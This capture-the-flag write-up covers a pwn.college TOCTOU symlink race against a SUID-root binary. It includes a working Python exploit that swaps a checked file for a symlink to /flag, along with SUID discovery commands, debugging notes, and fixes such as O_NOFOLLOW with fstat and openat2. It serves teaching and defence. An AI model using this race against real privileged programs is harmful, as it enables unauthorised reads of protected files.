# Stage 18: Race Conditions Level 1.0 — TOCTOU Symlink Race

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 1.0 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux |
| **Binary** | `/challenge/babyrace_level1.0` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level1.0` is a SUID-root program that accepts a pathname. It rejects any path containing the substring `flag`, rejects a symbolic link with `lstat()`, pauses twice for the operator, then calls `open()` and prints up to `0x100` bytes from the file.

The weakness is that the check and the open are separate pathname lookups. The program approves one filesystem object, then resolves the same pathname again later. If we can replace the approved regular file with a symlink to `/flag` between those two moments, the privileged `open()` follows the link and reads a file our normal user cannot read.

The result was a successful privileged file read and the challenge flag.

| Attribute | Details |
|-----------|---------|
| Vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Attack technique | Symlink race |
| Privilege boundary | SUID root |
| Target file | `/flag` |
| Exploitation language | Python 3 |
| Result | Successful privileged file read |

## Reconnaissance

Start by locating the binary and confirming what kind of file it is:

```bash
cd /challenge
ls -la
file ./babyrace_level1.0
```

Check the permissions:

```bash
ls -l /challenge/babyrace_level1.0
```

Observed permissions:

```text
-rwsr-xr-x 1 root root 17464 Jan 28 2025 /challenge/babyrace_level1.0
```

The important character is the `s` in the owner execute position. That is the SUID bit. The executable is owned by root, so a normal run can have:

| Credential | Value |
|------------|-------|
| Real UID | 1000 |
| Effective UID | 0 |
| Saved UID | 0 |
| Filesystem UID | 0 |

The exploit script confirms this through `/proc/<pid>/status` while the challenge is paused.

Useful follow-up inspection commands:

```bash
readelf -h /challenge/babyrace_level1.0
readelf -l /challenge/babyrace_level1.0
readelf -s /challenge/babyrace_level1.0
objdump -d -M intel /challenge/babyrace_level1.0
strings -a /challenge/babyrace_level1.0
```

For interactive analysis:

```bash
gdb -q /challenge/babyrace_level1.0
```

Inside GDB:

```gdb
set disassembly-flavor intel
info functions
disassemble main
info files
```

## Source

The original challenge source was not captured for this run, so the snippets below are not presented as a verbatim copy. They are the vulnerable pattern the binary exhibits, written to isolate the exact gap the exploit uses.

### The vulnerable pattern

```c title="toctou-pattern.c" keys="3,9"
struct stat st;

if (lstat(path, &st) == 0) {
    if (S_ISLNK(st.st_mode)) {
        return 1;
    }
}

int fd = open(path, O_RDONLY);
```

In plain English: the program looks at the path once with `lstat()` to decide whether it is a symlink, then looks at the same path again with `open()`. Nothing forces the second lookup to return the same filesystem object the first lookup approved. That gap is the vulnerability.

### Why `lstat()` matters

Linux offers several ways to inspect a file, and they differ in how they treat symbolic links:

| Function | Follows final symlink? | What it inspects |
|----------|------------------------|------------------|
| `stat()` | Yes | The target of the link |
| `lstat()` | No | The link itself |
| `fstat()` | Not applicable | An already-open descriptor |

The distinction in C:

```c title="stat-vs-lstat.c"
struct stat st;

stat("/tmp/example", &st);   /* follows the symlink */
lstat("/tmp/example", &st);  /* inspects the symlink itself */
```

On the command line, GNU `stat` defaults to the link itself, `stat -L` follows it, and `readlink` prints the stored target. Those commands are convenient, but the vulnerability lives in the C library calls the program makes.

The challenge uses `lstat()` correctly for the question it asks: "Is this pathname a symlink right now?" The problem is that "right now" is not the same as "when `open()` runs."

### The program's execution flow

The program performs these logical operations:

1. Reads the supplied pathname from `argv[1]`.
2. Checks whether the pathname contains the substring `flag`.
3. Waits at a synchronization point.
4. Calls `lstat()` on the pathname.
5. Rejects the path if it is a symbolic link.
6. Sleeps for approximately 10,000 microseconds.
7. Waits at another synchronization point.
8. Calls `open(argv[1], O_RDONLY)`.
9. Reads up to `0x100` bytes.
10. Writes the resulting data to standard output.

The important sequence is:

```c title="check-then-use.c" keys="1,5"
lstat(path, &st);

/* Time passes */

open(path, O_RDONLY);
```

The program never binds the later open to the object that `lstat()` inspected. It only remembers the pathname string.

## Exploitation Strategy

The goal is to make the program inspect a regular file and then open a symbolic link.

The chosen path was:

```text
/home/hacker/race/testfile
```

That path does not contain the substring `flag`, so it passes the string check. The initial object was a normal regular file:

```text
/home/hacker/race/testfile
```

After validation, it was replaced with:

```text
/home/hacker/race/testfile -> /flag
```

The pathname never changed. The filesystem object it pointed to did.

| Stage | Program | Attacker |
|-------|---------|----------|
| T0 | Starts execution | Creates a regular file |
| T1 | Checks the pathname | Waits |
| T2 | Calls `lstat()` | Waits |
| T3 | Pauses execution | Removes the regular file |
| T4 | Paused | Creates a symlink to `/flag` |
| T5 | Resumes execution | Symlink is installed |
| T6 | Calls `open()` | Waits |
| T7 | Reads the file contents | Receives output |

## Solution

### 1. Prepare the working directory

Create the directory and a regular file that passes the check:

```bash
mkdir -p /home/hacker/race
rm -f /home/hacker/race/testfile
echo "INITIAL REGULAR FILE" > /home/hacker/race/testfile
```

Verify that the file exists and is not a symlink:

```bash
ls -l /home/hacker/race/testfile
stat /home/hacker/race/testfile
```

The file must initially be a regular file. If it is a symlink at this point, `lstat()` rejects it before the race even begins.

### 2. The exploit script

The script does three things:

- It starts the SUID binary behind a pseudo-terminal so it can read the program's pauses and send Enter.
- It waits for the first pause, lets `lstat()` run against the real regular file, then waits for the second pause.
- During the second pause it deletes the regular file, installs a symlink to `/flag`, and lets the program continue into `open()`.

```python title="race-exploit.py" keys="84,94,97,105,111,114"
#!/usr/bin/env python3

import os
import pty
import select
import time
import sys

BINARY = "/challenge/babyrace_level1.0"
TARGET = "/home/hacker/race/testfile"
SYMLINK_TARGET = "/flag"

def remove_existing_target():
    try:
        os.unlink(TARGET)
    except FileNotFoundError:
        pass

def prepare_regular_file():
    remove_existing_target()

    with open(TARGET, "w") as f:
        f.write("INITIAL REGULAR FILE\n")

    print("[+] Created initial regular file")
    print("[+] Path:", TARGET)

def print_credentials(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith(("Uid:", "Gid:", "NoNewPrivs:")):
                    print("[PROCESS]", line.strip())
    except FileNotFoundError:
        print("[!] Process status unavailable")

def read_until(fd, marker, timeout=15):
    data = b""
    deadline = time.monotonic() + timeout

    while marker not in data:
        remaining = deadline - time.monotonic()

        if remaining <= 0:
            raise TimeoutError("Challenge synchronization timed out")

        ready, _, _ = select.select([fd], [], [], remaining)

        if not ready:
            raise TimeoutError("No output received")

        chunk = os.read(fd, 4096)

        if not chunk:
            raise RuntimeError("Challenge exited unexpectedly")

        data += chunk
        sys.stdout.write(chunk.decode(errors="replace"))
        sys.stdout.flush()

    return data

def read_remaining(fd):
    while True:
        ready, _, _ = select.select([fd], [], [], 3)

        if not ready:
            break

        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break

        if not chunk:
            break

        sys.stdout.write(chunk.decode(errors="replace"))
        sys.stdout.flush()

def main():
    prepare_regular_file()

    pid, fd = pty.fork()

    if pid == 0:
        os.execv(BINARY, [BINARY, TARGET])

    try:
        time.sleep(0.1)

        print_credentials(pid)

        marker = b"Paused (press enter to continue)"

        # First synchronization point.
        read_until(fd, marker)

        print("\n[+] First pause reached")
        print("[+] Allowing lstat validation to execute")

        os.write(fd, b"\n")

        # Wait for the second pause.
        read_until(fd, marker)

        print("\n[+] Second pause reached")
        print("[+] Replacing regular file with symlink")

        # Remove the original regular file.
        os.unlink(TARGET)

        # Install the symlink.
        os.symlink(SYMLINK_TARGET, TARGET)

        print("[+] Symlink installed")
        print("[+] Link:", os.readlink(TARGET))

        # Continue to the open() operation.
        os.write(fd, b"\n")

        # Collect the challenge output.
        read_remaining(fd)

    finally:
        try:
            os.close(fd)
        except OSError:
            pass

        try:
            os.waitpid(pid, 0)
        except ChildProcessError:
            pass

if __name__ == "__main__":
    main()
```

### 3. Run it

```bash
python3 /tmp/exploit.py
```

Expected successful output includes:

```text
[PROCESS] Uid:  1000    0       0       0
[PROCESS] Gid:  1000    1000    1000    1000

[+] First pause reached
[+] Allowing lstat validation to execute

[+] Second pause reached
[+] Replacing regular file with symlink

[+] Symlink installed
[+] Link: /flag

pwn.college{...}
### Goodbye!
```

The exact flag is specific to the challenge instance.

## Why the Exploit Worked

The exploit depended on four conditions lining up.

### A privileged executable

The binary is SUID root, and the process credentials confirm it:

```text
Uid: 1000 0 0 0
```

The second value is the effective UID, so `EUID = 0`. That is what lets the process read `/flag` even though the invoking user cannot.

### A pathname accepted by validation

`/home/hacker/race/testfile` does not contain `flag`, so the substring check passes. Using `/flag` directly as the pathname would be rejected before any race could begin.

### A regular file during `lstat()`

At validation time `testfile` is a normal regular file. The symbolic-link check therefore passes.

### Replacement before `open()`

At the second pause the script runs:

```python
os.unlink(TARGET)
os.symlink("/flag", TARGET)
```

The later `open()` follows the new symlink. The effective root privileges let the process read the protected file.

## Why `/tmp` Failed

The first attempt used:

```text
/tmp/testfile
```

The program reached the second pause and the symlink was installed, but no flag appeared. Moving the target to:

```text
/home/hacker/race/testfile
```

made the exploit succeed.

A relevant Linux protection is:

```text
fs.protected_symlinks
```

It restricts certain symlink-following operations in sticky, world-writable directories such as `/tmp`. Inspect it with:

```bash
cat /proc/sys/fs/protected_symlinks
```

The directory change made the difference in this environment. The successful run proves the new path avoided the obstacle; it does not independently prove that `fs.protected_symlinks` was the exact reason the earlier run failed. Treat that as the most likely explanation, not a measured conclusion.

## Understanding the `strace` Results

An earlier diagnostic command was:

```bash
strace -f -e trace=open,openat,lstat,newfstatat,read,write \
python3 /tmp/exploit.py
```

The traced execution showed:

```text
openat(AT_FDCWD, "/tmp/testfile", O_RDONLY)
= -1 EACCES (Permission denied)
```

It also showed:

```text
read(-1, ..., 256) = -1 EBADF
```

This was not a valid test of normal SUID execution. Tracing a SUID executable can suppress privilege elevation. The traced child showed:

```text
Uid: 1000 1000 1000 1000
```

Instead of:

```text
Uid: 1000 0 0 0
```

The traced process was therefore not running with the same effective privileges.

**Important debugging lesson:** do not assume a SUID exploit behaves identically under a debugger or tracer. Instrumentation can change the security properties you are trying to investigate.

## How to Fix It

The vulnerability exists because the program validates a pathname and later resolves that pathname again. A robust implementation avoids the pattern entirely.

### Open first, then inspect the descriptor

```c title="safe-open.c" keys="1,10,16"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0) {
    perror("open");
    return 1;
}

struct stat st;

if (fstat(fd, &st) < 0) {
    perror("fstat");
    close(fd);
    return 1;
}

if (!S_ISREG(st.st_mode)) {
    close(fd);
    return 1;
}
```

In plain English: `O_NOFOLLOW` refuses to follow a symlink in the final pathname component. `fstat()` then inspects the exact object that was opened, so there is no second pathname lookup for an attacker to race.

`O_NOFOLLOW` protects the final component only. A path with symlinked parent directories still needs stronger controls.

### Use `openat2()`

On supported Linux systems, `openat2()` adds path-resolution restrictions. Relevant flags include:

- `RESOLVE_NO_SYMLINKS`
- `RESOLVE_NO_MAGICLINKS`
- `RESOLVE_BENEATH`
- `RESOLVE_IN_ROOT`

These constrain path traversal and symlink resolution more completely than a single `O_NOFOLLOW` flag.

### Reduce privilege exposure

Avoid unnecessary SUID-root executables. Where possible:

- Remove SUID permissions.
- Use narrowly scoped capabilities instead of full root.
- Drop privileges before processing attacker-controlled paths.
- Restrict filesystem access.
- Validate file ownership and type on the opened descriptor.
- Avoid privileged operations on attacker-controlled pathnames.

## What This Challenge Teaches

1. Linux filesystem pathname resolution.
2. Symbolic links and inode behavior.
3. The difference between `stat()`, `lstat()`, and `fstat()`.
4. TOCTOU vulnerabilities.
5. SUID execution and effective UID.
6. Process synchronization.
7. Pseudo-terminals and interactive process control.
8. Linux filesystem permission checks.
9. Race-condition exploitation.
10. Debugging privileged processes without confusing instrumented and normal execution.

## Further Research

### Filesystem race conditions

Study symlink races, hard-link attacks, temporary-file races, directory traversal races, file replacement races, rename-based races, and races involving file ownership or permissions.

Useful Linux system calls:

```text
open()
openat()
openat2()
stat()
lstat()
fstat()
fstatat()
access()
readlink()
symlink()
link()
rename()
renameat()
unlink()
unlinkat()
mkdir()
```

### Linux process and privilege internals

Study real UID, effective UID, saved UID, filesystem UID, Linux capabilities, SUID execution, `execve()`, `setuid()`, `setresuid()`, `no_new_privs`, user namespaces, and mount namespaces.

Useful inspection commands:

```bash
id
cat /proc/self/status
getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

Run broad SUID discovery only on systems you own or are authorized to assess.

### Binary exploitation tools

| Tool | Purpose |
|------|---------|
| GDB | Debugging |
| GEF | GDB exploitation assistance |
| pwndbg | Binary debugging |
| checksec | Mitigation inspection |
| readelf | ELF inspection |
| objdump | Disassembly |
| strace | System-call tracing |
| ltrace | Library-call tracing |
| pwntools | Exploit automation |
| GCC | Compiling test binaries |
| Python | PoC development |

### Race-condition research

Research deterministic versus probabilistic races, synchronization barriers, scheduling behavior, atomic filesystem operations, thread-based races, process-based races, race-window measurement, filesystem caching, kernel pathname resolution, and concurrent rename operations.

### Further vulnerability classes

After filesystem TOCTOU, study:

1. Use-after-free.
2. Double-free.
3. Heap overflow.
4. Integer overflow.
5. Out-of-bounds read and write.
6. Format-string vulnerabilities.
7. Race conditions in multithreaded applications.
8. File descriptor confusion.
9. Path traversal.
10. Privilege escalation through insecure file operations.

## Practice Lab

Build a small C program that reproduces the vulnerability:

```c title="lab-vulnerable.c" keys="1,5"
lstat(path, &st);

/* Synchronization delay */

open(path, O_RDONLY);
```

Then build the patched version:

```c title="lab-patched.c" keys="1,3"
int fd = open(path, O_RDONLY | O_NOFOLLOW);

fstat(fd, &st);
```

Compare the two implementations and document:

- What the program checks.
- What the attacker can change.
- Which system calls are involved.
- Whether the race succeeds.
- What the patched version prevents.
- What limitations remain.

That comparison is more valuable than memorizing the exploit command.

## Conclusion

This challenge demonstrated a classic filesystem TOCTOU vulnerability in a privileged Linux executable. It did not require a stack overflow, a canary bypass, NX defeat, or control-flow corruption. It required changing filesystem state between two separate pathname operations.

The decisive sequence was:

```text
Regular file
    |
    v
lstat() validation
    |
    v
Validation succeeds
    |
    v
Replace regular file with symlink
    |
    v
open() follows symlink
    |
    v
Privileged file read
```

The central exploit-development lesson is:

> A security check on a pathname does not guarantee that the same pathname will identify the same filesystem object when it is subsequently used.
